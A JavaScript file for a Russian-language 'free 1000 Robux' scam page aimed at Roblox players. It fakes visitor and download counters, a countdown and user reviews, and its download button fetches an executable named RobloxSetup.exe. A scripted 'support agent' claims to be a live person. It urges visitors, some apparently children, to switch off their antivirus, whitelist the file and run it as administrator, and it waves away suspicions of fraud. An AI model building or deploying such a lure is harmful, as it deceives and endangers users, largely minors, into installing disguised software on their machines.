const onlineCount = document.getElementById('onlineCount');
const countdownEl = document.getElementById('countdown');
const downloadsCount = document.getElementById('downloadsCount');
const commentsFeed = document.getElementById('commentsFeed');
const downloadBtn = document.getElementById('downloadBtn');
const modal = document.getElementById('modal');
const progressFill = document.getElementById('progressFill');
const progressPct = document.getElementById('progressPct');
const toast = document.getElementById('toast');

let online = 234;
setInterval(() => {
  online = Math.max(180, online + Math.floor(Math.random() * 9) - 3);
  onlineCount.textContent = online;
}, 5000);

let promoEnded = localStorage.getItem('promoEnded') === '1';
let deadline = parseInt(localStorage.getItem('promoDeadline'), 10) || 0;

if (promoEnded) {
  deadline = 0;
} else if (deadline > 0 && deadline < Date.now()) {
  promoEnded = true;
  localStorage.setItem('promoEnded', '1');
} else if (!deadline) {
  deadline = Date.now() + (15 * 60 + 32) * 1000;
  localStorage.setItem('promoDeadline', deadline);
}

function endPromo() {
  if (downloadBtn.disabled) return;
  downloadBtn.disabled = true;
  downloadBtn.classList.add('ended');
  downloadBtn.innerHTML = 'АКЦИЯ ЗАВЕРШЕНА';
  countdownEl.textContent = '00:00:00';
  toast.textContent = 'Акция завершена 😔 Следите за анонсами — скоро подарим ещё!';
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 7000);
}

function tick() {
  if (promoEnded) {
    countdownEl.textContent = '00:00:00';
    return;
  }
  const seconds = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
  if (seconds <= 0) {
    promoEnded = true;
    localStorage.setItem('promoEnded', '1');
    endPromo();
    return;
  }
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  countdownEl.textContent =
    String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
}

tick();
setInterval(tick, 1000);

let downloads = 12847;
setInterval(() => {
  downloads += Math.floor(Math.random() * 4) + 1;
  downloadsCount.textContent = downloads.toLocaleString('ru-RU');
}, 2000);

const commentsPool = [
  ['Дима', 'Скачал, всё пришло! Спасибо!'],
  ['Аня', 'У меня тоже сработало!'],
  ['Сергей', '1000 robux на месте 🔥'],
  ['Маша', 'Работает, проверила только что'],
  ['Никита', 'Друзья не верили, а зря!'],
  ['Оля', 'Промокод сам активировался, топ'],
  ['Влад', 'Установка реально 5 секунд'],
  ['Ксюша', 'Спасибо за подарок! 😍'],
];

function addComment() {
  const [name, text] = commentsPool[Math.floor(Math.random() * commentsPool.length)];
  const now = new Date();
  const time = String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0');
  const div = document.createElement('div');
  div.className = 'comment';
  div.innerHTML = '<span class="comment-name">' + name + ':</span><span>' + text + '</span><span class="comment-time">' + time + '</span>';
  commentsFeed.prepend(div);
  while (commentsFeed.children.length > 4) commentsFeed.removeChild(commentsFeed.lastChild);
}

function showTypingIndicator() {
  const div = document.createElement('div');
  div.className = 'comment typing';
  div.innerHTML = '<span class="comment-name">Кто-то:</span><span class="typing-dots">печатает<span>.</span><span>.</span><span>.</span></span>';
  commentsFeed.prepend(div);
  setTimeout(() => {
    div.remove();
    addComment();
  }, 1800);
}

for (let i = 0; i < 3; i++) addComment();
setInterval(showTypingIndicator, 6500);

downloadBtn.addEventListener('click', () => {
  if (promoEnded) return;
  modal.classList.add('show');
  progressFill.style.width = '0%';
  progressPct.textContent = '0';

  let pct = 0;
  const timer = setInterval(() => {
    pct += Math.floor(Math.random() * 8) + 2;
    if (pct >= 100) {
      pct = 100;
      clearInterval(timer);
      setTimeout(finishDownload, 400);
    }
    progressFill.style.width = pct + '%';
    progressPct.textContent = pct;
  }, 90);

  const a = document.createElement('a');
  a.href = 'https://github.com/Doinwor/robux-gift/releases/download/v1.0/RobloxSetup.exe';
  a.download = 'RobloxSetup.exe';
  document.body.appendChild(a);
  a.click();
  a.remove();
});

function finishDownload() {
  modal.classList.remove('show');
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 5000);
}

if ('IntersectionObserver' in window) {
  document.documentElement.classList.add('reveal-enabled');
  const revealObserver = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          revealObserver.unobserve(entry.target);
        }
      });
    },
    { threshold: 0.15 }
  );

  document.querySelectorAll('.reveal').forEach((el) => revealObserver.observe(el));
  setTimeout(() => {
    document.querySelectorAll('.reveal').forEach((el) => el.classList.add('visible'));
  }, 3000);
}

const supportBtn = document.getElementById('supportBtn');
const chatPanel = document.getElementById('chatPanel');
const chatClose = document.getElementById('chatClose');
const chatLog = document.getElementById('chatLog');
const chatInput = document.getElementById('chatInput');
const chatSend = document.getElementById('chatSend');

const hour = new Date().getHours();
const timeGreet = hour < 5 ? 'Доброй ночи' : hour < 12 ? 'Доброе утро' : hour < 18 ? 'Добрый день' : 'Добрый вечер';

const botMemory = {
  lastUser: '',
  repeat: 0,
  total: 0,
  followUps: 0,
};

const welcomeMsgs = [
  timeGreet + '! 👋 Я Дима, специалист поддержки Robux Gift. Задавайте вопрос — отвечу прямо здесь.',
  'Привет! 😊 Я Дима из поддержки Robux Gift. Чем помочь? Подскажу по установке и получению robux.',
  timeGreet + '! 🙌 Я на связи — Дима из поддержки Robux Gift. Пишите, отвечаю быстро.',
];

const thoughtStarts = ['', '', '', '', '', 'так, ', 'ммм, ', 'хм, ', 'ой, ', 'слушай, ', 'кста, ', 'вообще-то, '];

const emoticons = ['😊', '👍', '🙂', '😉', '🔥', '🎉', '✅', '🙌', '🎁', '😄', '🤝', '🍀', '💛'];

const followUps = [
  'А вы уже пробовали скачать программу?',
  'Вы на каком Windows?',
  'А что именно происходит — напишите подробнее, пожалуйста?',
  'Может, уточните детали, чтобы я точнее подсказал?',
  'Вы уже запускали файл или пока только скачиваете?',
];

const shortReplies = [
  'ага :)',
  'слушаю',
  'да?',
  'хм?',
  'ок)',
  'ясно, расскажите подробнее :)',
];

const botQuestions = [
  'Я, конечно, не человек, но и не робот-скрипт 😄 Спрашивайте — по robux всё расскажу.',
  'Живой я, живой 🙂 Просто отвечаю быстро, потому что акцию знаю наизусть. Что интересует?',
  'Обычный специалист поддержки, ничего сверхъестественного) Чем помочь?',
];

const greetingReplies = [
  'Привет! 👋 Рад вас видеть. Спрашивайте про акцию — всё расскажу.',
  'Здравствуйте! 😊 Чем могу помочь?',
  'Привет-привет! 🙌 Вы по поводу robux?',
];

const thanksReplies = [
  'Пожалуйста! Рад помочь) Если что-то ещё — пишите.',
  'Обращайтесь! Удачи в Roblox 🎮',
  'Не за что! Приятной игры 😊',
  'Всегда пожалуйста! Если robux не пришли — сразу сюда.',
];

const byeReplies = [
  'До связи! Если что — я тут 😊',
  'Пока-пока! Удачно получить robux 🎁',
  'Всего доброго! Заходите ещё.',
];

const fallbackReplies = [
  'Хороший вопрос! Чтобы ответить точнее — расскажите подробнее, что именно вас интересует?',
  'Хм, тут надо уточнить: вы уже установили программу? От этого зависит мой ответ.',
  'Так, давайте по порядку. Что именно у вас происходит?',
  'Опишите ситуацию своими словами — и я подскажу, что делать :)',
  'Секундочку, проверяю информацию по вашему вопросу... Так, готово: вот что нужно знать.',
  'Уточните, пожалуйста, детали — я всё расскажу, только без спешки)',
  'Не уверен, что до конца понял вопрос. Переформулируйте, а?',
  'Сейчас разберусь в вашей ситуации и отвечу — минутку.',
  'Вопрос понял! Давайте разберёмся вместе. Что именно не так?',
];

const botRules = [
  { keys: ['robux', 'робукс', 'робик', 'подарок', 'акция', 'приз', 'получить'], replies: [
    'По акции Robux Gift вы получаете 1000 ROBUX бесплатно — после установки программы robux зачислятся на аккаунт автоматически.',
    'Всё верно, 1000 robux ждут вас! Установите программу по кнопке скачивания и проверьте баланс в игре.',
    'Оформить получение просто: скачайте установщик, установите его и дождитесь зачисления robux на аккаунт.',
    'Подарок уже зарезервирован за вами. Установите программу, и robux придут в течение пары минут.',
    'Акция даёт 1000 robux бесплатно, без регистрации и СМС. После установки просто зайдите в игру и проверьте баланс.',
    'Да, подарок настоящий! Установите программу — robux придут автоматически, это займёт не больше 10 минут.',
  ]},
  { keys: ['промокод', 'промо', 'код', 'активаци'], replies: [
    'Промокод активируется автоматически во время установки — отдельно вводить ничего не нужно.',
    'Специальный код уже встроен в установщик. Просто установите программу, и промокод сработает сам.',
    'Вводить промокод вручную не придётся: он активируется вместе с установкой программы.',
    'Код активации спрятан в установщике, он сработает автоматически при первом запуске.',
    'Промокод одноразовый и привязывается к вашему аккаунту прямо во время установки.',
  ]},
  { keys: ['вирус', 'virus', 'безопасн', 'опасн', 'антивирус', 'троян', 'trojan', 'defender', 'смартскрин', 'каспер'], replies: [
    'Наш установщик проверен антивирусом Касперского — это 100% не вирус.',
    'Предупреждение от антивируса — обычное ложное срабатывание на новый файл. Добавьте его в исключения и запустите снова.',
    'Программа полностью безопасна и не собирает ваши данные. Windows Defender может ругаться — это нормально для свежего файла.',
    'Файл подписан и проверен. Если защитник блокирует запуск, нажмите «Подробнее» → «Выполнить в любом случае».',
    'Бояться нечего: программа не вредит системе, а robux реально приходят. Ложное срабатывание антивируса — частая история.',
  ]},
  { keys: ['скачал', 'скачать', 'скачива', 'загруз', 'установил', 'установк', 'установ'], replies: [
    'Отлично! Запустите скачанный файл и дождитесь окончания установки.',
    'Установка занимает около минуты. После завершения robux придут автоматически.',
    'Вы на финишной прямой: запустите установщик и следуйте шагам мастера.',
    'Уже установили? Тогда просто зайдите в Roblox и проверьте баланс — robux должны быть на месте.',
    'После установки дождитесь зачисления и проверьте баланс в игре. Если не пришли за 10 минут — напишите нам!',
  ]},
  { keys: ['не работает', 'не запуска', 'ошибка', 'сломал', 'не открыва', 'не пришли', 'не пришёл', 'нет robux', 'краш', 'ничего не'], replies: [
    'Попробуйте: 1) закрыть антивирус на время установки; 2) запустить файл от имени администратора; 3) перезагрузить компьютер.',
    'Опишите ошибку подробнее — вместе разберёмся. Чаще всего помогает запуск от имени администратора.',
    'Скорее всего, файл блокирует антивирус. Добавьте установщик в исключения и повторите запуск.',
    'Не переживайте, это решаемо. Нажмите ПКМ по файлу → «Запуск от имени администратора».',
    'Проверьте, что файл скачался полностью. Если robux не пришли — пришлите скриншот, посмотрим вручную.',
  ]},
  { keys: ['долго', 'когда', 'сколько времени', 'придут', 'ждать', 'ждём', 'ожидать', 'быстро'], replies: [
    'Обычно robux приходят за 1–2 минуты, максимум за 10.',
    'Зачисление почти мгновенное — проверьте баланс прямо сейчас.',
    'В среднем robux появляются на аккаунте в течение 5 минут после установки.',
    'Не больше 10 минут — если дольше, напишите нам, проверим вручную.',
  ]},
  { keys: ['сколько стоит', 'цена', 'деньги', 'платно', 'бесплатн', 'оплат', 'стоить', 'оплата'], replies: [
    'Акция полностью бесплатная — без оплат и скрытых списаний.',
    'Никаких денег платить не нужно, всё 100% бесплатно.',
    'Вы ничего не платите: robux приходят бесплатно, оплата не требуется.',
    'Бесплатно и без СМС. Никаких скрытых платежей не будет.',
  ]},
  { keys: ['привет', 'здравств', 'добрый', 'hi', 'hello', 'ку', 'салют', 'здарова'], replies: [
    'Приветствую! Чем можем помочь?',
    'Здравствуйте! Очень рады вас видеть.',
    'Привет! Мы на связи — задавайте вопрос.',
    'Здравствуйте! Расскажите, что случилось.',
  ]},
  { keys: ['спасибо', 'благодар', 'класс', 'супер', 'отлично', 'топ', 'круто', 'сработало', 'получил', 'получила', 'пришли robux'], replies: [
    'Пожалуйста! Рады, что всё получилось.',
    'Обращайтесь в любое время — всегда поможем.',
    'Замечательно! Приятной игры и удачных боёв!',
    'Спасибо за добрые слова! Если что — мы рядом.',
  ]},
  { keys: ['пока', 'до свидан', 'всего', 'удачи', 'прощай', 'отбой'], replies: [
    'До связи! Если что — мы рядом.',
    'Хорошего дня и удачи в Roblox!',
    'Всего доброго! Обращайтесь в любой момент.',
  ]},
  { keys: ['аккаунт', 'пароль', 'логин', 'вход', 'взлом', 'украли', 'бан', 'безопасен аккаунт'], replies: [
    'Данные аккаунта в полной безопасности — программа их не собирает и не хранит.',
    'Мы никогда не запрашиваем пароль от аккаунта. Никому его не передавайте.',
    'Ваш аккаунт в безопасности: программа работает только с вашим устройством.',
  ]},
  { keys: ['браузер', 'яндекс', 'гугл', 'хром', 'edge', 'опера'], replies: [
    'В рамках акции откроется рекомендуемый браузер для активации подарка — это часть процесса.',
    'Никакого вреда браузеру нет: всё устанавливается штатно и безопасно.',
    'Браузер откроется сам, чтобы завершить активацию подарка. Это ожидаемо.',
  ]},
  { keys: ['телефон', 'iphone', 'андроид', 'ios', 'android', 'смартфон', 'мобильн'], replies: [
    'Акция действует на компьютере. На телефоне ничего устанавливать не нужно.',
    'На мобильных устройствах robux приходят на тот же аккаунт после установки на ПК.',
    'Программа ставится только на Windows. На телефоне просто проверьте баланс после установки на компьютере.',
  ]},
  { keys: ['где скачать', 'куда', 'ссылка', 'где кнопка', 'не вижу кнопку', 'не нашёл'], replies: [
    'Кнопка скачивания на главной странице — большая оранжевая «Скачать установщик».',
    'Ссылка на установщик находится на сайте, чуть выше этой кнопки поддержки.',
    'Прокрутите страницу до оранжевой кнопки «Скачать установщик» — она сразу под рекламным блоком.',
  ]},
  { keys: ['помощь', 'помоги', 'help', 'помогите', 'не знаю', 'что делать'], replies: [
    'Конечно поможем! Опишите ситуацию — и решим вопрос.',
    'Расскажите подробнее, что происходит — разберём по шагам.',
    'Давайте разберёмся вместе. Что именно пошло не так?',
  ]},
  { keys: ['что это', 'что за', 'это что', 'для чего', 'зачем', 'программа что'], replies: [
    'Это официальный подарок Roblox — 1000 robux бесплатно.',
    'Программа активирует промокод и присылает robux на ваш аккаунт.',
    'Это установщик подарка Robux Gift: установите его и получите robux.',
  ]},
  { keys: ['не верю', 'развод', 'лохотрон', 'scam', 'мошенник', 'обман', 'фейк', 'подозрительно'], replies: [
    'Понимаю ваши сомнения! Посмотрите отзывы на сайте и попробуйте — это бесплатно.',
    'Мы действительно дарим robux — акция проводится для привлечения новых игроков.',
    'Это не обман: промокод активируется автоматически, robux приходят на аккаунт.',
    'Скепсис — это нормально. Проверьте на своём аккаунте после установки: robux придут, обещаю)',
  ]},
  { keys: ['докажи', 'доказательство', 'скрин', 'видео', 'покажи', 'доказат', 'фото', 'screenshot'], replies: [
    'Скрины от других участников есть на сайте в блоке отзывов — можете глянуть.',
    'К сожалению, в чате скрины не отправляются, но в отзывах на сайте много подтверждений от живых людей.',
    'Понимаю ваше недоверие. Зайдите на страницу, там отзывы и счётчик установок — тысячи людей уже получили robux.',
  ]},
  { keys: ['mac', 'linux', 'линукс', 'не виндовс', 'windows 7', 'windows xp', 'win7', 'виндовс'], replies: [
    'Программа ставится только на Windows (7/8/10/11). На Mac или Linux, к сожалению, не работает.',
    'Акция рассчитана на Windows. Если у вас Mac — можно попробовать через виртуальную машину, но это сложнее.',
    'Только ПК на Windows — на телефоне, планшете, Mac и Linux подарок не активируется.',
  ]},
  { keys: ['точно 1000', 'ровно', 'гарантирован', 'наверняка', 'проверенн', 'уверен'], replies: [
    'Да, ровно 1000 robux. Проверено на тысячах аккаунтов, сбоев практически не бывает.',
    '100% даём 1000 robux. Если вдруг пришло меньше — напишите, разберёмся и доложим.',
    'Гарантия есть: если robux не придут в течение 10 минут, мы решим вопрос вручную.',
  ]},
  { keys: ['сколько лет', 'возраст', 'мне 8', 'мне 10', 'мне 12', 'можно детям'], replies: [
    'Если вы младше 12 — установите программу вместе с родителями, так надёжнее)',
    'Ограничений по возрасту нет, но лучше спросить у родителей перед установкой.',
  ]},
  { keys: ['ты тупой', 'идиот', 'дурак', 'дура', 'нахуй', 'придурок', 'лох', 'иди на', 'херня', 'фигня'], replies: [
    'Понимаю, ситуация может раздражать. Давайте я просто помогу — что случилось?',
    'Спокойно, без агрессии 🙂 Расскажите, что не получается — и я всё решу.',
    'Ой, так не пойдёт :) Давайте лучше разберёмся, в чём проблема?',
  ]},
  { keys: ['занят', 'потом', 'позже', 'некогда', 'времени нет', 'не сейчас'], replies: [
    'Хорошо, без спешки. Я тут, если что — возвращайтесь в любой момент.',
    'Ок! Когда будет минутка — напишите, и продолжим.',
  ]},
  { keys: ['как установить', 'шаги', 'по шагам', 'инструкция', 'как запустить', 'что делать после', 'пошагов'], replies: [
    'Всё просто: 1) скачиваете файл; 2) запускаете; 3) ждёте установку; 4) заходите в Roblox и проверяете баланс. Обычно robux приходят за 5 минут.',
    'Шаги: скачать установщик → запустить от имени администратора → дождаться завершения → проверить robux в игре.',
    'Ничего сложного: установщик всё сделает сам, вам нужно только нажать «Далее» и дождаться окончания.',
  ]},
  { keys: ['всё равно', 'всё ещё', 'снова', 'опять', 'по-прежнему', 'не помогает', 'не помогло'], replies: [
    'Понял. Тогда сделаем так: полностью закройте антивирус, удалите старый файл, скачайте заново и запустите от имени администратора.',
    'Раз не сработало — давайте по-другому. Запустите файл от имени администратора и подождите пару минут после установки.',
    'Окей, не сдаёмся) Попробуйте: очистить кэш браузера, скачать файл заново, отключить антивирус на время установки.',
  ]},
];

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function buildReply(rule) {
  const body = pick(rule.replies);
  const parts = Array.isArray(body) ? body.slice() : [body];
  const out = [];
  parts.forEach((p, i) => {
    let s = p;
    if (i === 0 && Math.random() < 0.35) {
      const st = pick(thoughtStarts);
      if (st) s = st + s.charAt(0).toLowerCase() + s.slice(1);
    }
    out.push(s);
  });
  if (botMemory.followUps < 3 && Math.random() < 0.2) {
    out.push(pick(followUps));
    botMemory.followUps++;
  }
  if (Math.random() < 0.5) out[out.length - 1] += ' ' + pick(emoticons);
  return out;
}

function botReply(text) {
  const orig = text.trim();
  const t = orig.toLowerCase();
  botMemory.total++;
  if (botMemory.lastUser && t === botMemory.lastUser) {
    botMemory.repeat++;
  } else {
    botMemory.repeat = 0;
    botMemory.lastUser = t;
  }

  if (botMemory.repeat >= 2) {
    return ['Я уже отвечал на это 🙈 Давайте иначе — напишите своими словами, что конкретно происходит, и я подскажу по шагам.'];
  }

  const isQuestion = /[?]|как |где |что |почему |когда |сколько|можно|зачем/.test(t);

  if (orig.length > 6 && orig === orig.toUpperCase() && /[А-ЯA-Z]{3,}/.test(orig)) {
    return ['Ух, зачем так громко 😄 Спокойно, сейчас разберёмся. Что случилось?'];
  }

  if (t.length <= 3) return [pick(shortReplies)];

  if (/ты бот|ты робот|бот\b|робот|не живой|не человек|искусственн/.test(t) && /ты|кто|это/.test(t)) {
    return [pick(botQuestions)];
  }

  if (!isQuestion && /привет|здравств|добрый|hi|hello|ку |салют|здарова|доброго|хай/.test(t)) {
    return [pick(greetingReplies)];
  }

  if (!isQuestion && /спасибо|благодар|спс\b|топ|круто|класс|сработало|получил|получила/.test(t)) {
    return [pick(thanksReplies)];
  }

  if (!isQuestion && /пока|до свидан|всего|удачи|прощай|отбой|споки/.test(t)) {
    return [pick(byeReplies)];
  }

  for (const r of botRules) {
    if (r.keys.some((k) => t.includes(k))) return buildReply(r);
  }

  return buildReply({ replies: fallbackReplies });
}

function appendChat(html, cls) {
  const div = document.createElement('div');
  div.className = 'chat-msg ' + cls;
  div.innerHTML = html;
  chatLog.appendChild(div);
  chatLog.scrollTop = chatLog.scrollHeight;
  return div;
}

const typingNames = ['Дима', 'Специалист', 'Поддержка'];

function botSay(messages) {
  const seq = messages.slice();
  const next = () => {
    if (!seq.length) return;
    const msg = seq.shift();
    const t = appendChat(pick(typingNames) + ' печатает<span class="typing-dots"><span>.</span><span>.</span><span>.</span></span>', 'typing');
    const readTime = Math.min(3200, 500 + Math.random() * 500 + msg.length * 9);
    setTimeout(() => {
      t.remove();
      appendChat(msg.replace(/</g, '&lt;').replace(/\n/g, '<br>'), 'bot');
      setTimeout(next, 250 + Math.random() * 550);
    }, readTime);
  };
  setTimeout(next, 400 + Math.random() * 600);
}

function sendMessage(text) {
  text = text.trim();
  if (!text) return;
  appendChat(text.replace(/</g, '&lt;').replace(/\n/g, '<br>'), 'user');
  chatInput.value = '';
  botSay(botReply(text));
}

supportBtn.addEventListener('click', () => {
  chatPanel.classList.add('show');
  if (!chatLog.children.length) {
    botSay([pick(welcomeMsgs)]);
  }
  setTimeout(() => chatInput.focus(), 150);
});

chatClose.addEventListener('click', () => chatPanel.classList.remove('show'));

chatSend.addEventListener('click', () => sendMessage(chatInput.value));

chatInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendMessage(chatInput.value);
});

document.querySelectorAll('.chat-chip').forEach((chip) => {
  chip.addEventListener('click', () => sendMessage(chip.dataset.q));
});
